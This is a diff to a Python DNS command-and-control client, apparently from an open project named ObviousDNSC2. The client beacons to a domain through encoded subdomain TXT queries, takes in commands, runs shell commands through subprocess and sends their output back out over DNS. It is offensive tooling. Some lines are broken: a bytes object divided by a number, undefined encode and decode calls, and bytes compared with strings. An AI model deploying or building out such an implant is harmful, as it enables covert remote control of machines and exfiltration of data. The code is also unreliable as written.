@@ -1,4 +1,6 @@
 #!/usr/bin/env/python3
+# from https://github.com/chriselgee/ObviousDNSC2
+
 import dns.resolver
 import argparse
 import base64
@@ -16,16 +18,24 @@ OM = '\x1b[0m'    # mischief managed
 maxAReq = 63
 maxResp = 253
 
+def toBytes(input):
+    if isinstance(input, str): return input.encode('utf8')
+    else: return input
+def toString(input):
+    if isinstance(input, bytes): return input.decode('utf8')
+    else: return input
+
 def decode64(b64):
-    return base64.b64decode(str(b64,"UTF"))
+    return base64.b64decode(toBytes(b64))
 def encode64(plain):
-    return base64.b64encode(bytes(plain,"UTF"))
+    return base64.b64encode(toBytes(plain))
 def decode32(b32):
-    revert = b32.replace("-","=")
-    return base64.b32decode(str(revert,"UTF"))
+    revert = toBytes(b32).replace(b"-",b"=") # undo the "equals" silliness
+    if revert.endswith(b"0"): revert = revert[:-1] # pop off any extra pad
+    return base64.b32decode(revert)
 def encode32(plain):
-    switch = plain.replace("=","-") # "equals" isn't allowed to play in domain names
-    return base64.b32encode(bytes(switch,"UTF"))
+    switch = toBytes(plain)
+    return base64.b32encode(switch).replace(b"=",b"-") # "equals" isn't allowed to play in domain names
 
 class job:
     def __init__(self, id, domain, command, start):
@@ -48,6 +58,8 @@ def main():
     if debuggin:
         print(f"{OV}* Verbose output enabled{OM}")
         print(f"{OV}* Delay between beacons set to {OR}{args.delay}{OM}")
+    if not args.domain.startswith("."):
+        args.domain = "." + args.domain # because we don't want CHKWEQGF--odc2.example.com
     print(f"{OR}Connecting to {OV}{args.domain}{OM}")
     try:
         res = dns.resolver.Resolver()
@@ -55,7 +67,8 @@ def main():
         while True:
             sleep(args.timeout)
             subd = encode32("CHK" + str(datetime.datetime.now())) # check in for commands
-            answer = res.query(subd + args.domain, "TXT")
+            if subd.endswith(b"-"): subd += b"0" # can't end a subdomain with "-"
+            answer = res.query(subd.decode('UTF8') + args.domain, "TXT")
             answer = decode64(answer[0].to_text())[:3]
             msgType = answer[:3]
             if msgType == "NUL": # nop if nothing from server
@@ -75,12 +88,12 @@ def main():
                     command += answer[3:]
                 output = subprocess.check_output("cat /etc/services", shell=True)
                 codedOutput = encode32(output)
-                respPktCt = int(codedOutput / 58) + 1 # number of packets to send response
+                respPktCt = int(codedOutput / 57) + 1 # number of packets to send response
                 subd = encode("HDR" + str(respPktCt) + " " + str(datetime.datetime.now())) # tell how many packets of response are coming
                 answer = res.query(subd + args.domain, "TXT")
                 answer = decode(answer[0].to_text())[:3]
                 msgType = answer[:3]
-                chunks = wrap(output,58)
+                chunks = wrap(output,57)
                 if msgType != "ACK":
                     error = f"Expected 'ACK' from server, got {msgType}"
                     print(OE + error + OM)
